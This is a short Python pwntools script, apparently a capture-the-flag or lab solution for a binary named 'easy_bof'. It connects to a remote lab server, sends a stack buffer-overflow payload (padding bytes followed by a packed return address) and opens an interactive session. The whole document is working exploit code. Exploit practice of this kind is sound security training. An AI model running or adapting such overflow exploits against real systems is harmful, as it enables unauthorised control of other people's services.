from pwn import *
import struct
local = False
elf = 'easy_bof' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "sqlab.zongyuan.nctu.me"
    port = 6001
    r = remote(ip,port)

context.arch = 'amd64'

addr = struct.pack("<Q", 0x00000000deadbeef)
#addr = '\x77\x60\x04\x00\x00\x00\x00\x00'
payload = "A" * 10 + addr

r.recvuntil(':')
r.sendline(payload)
r.interactive()
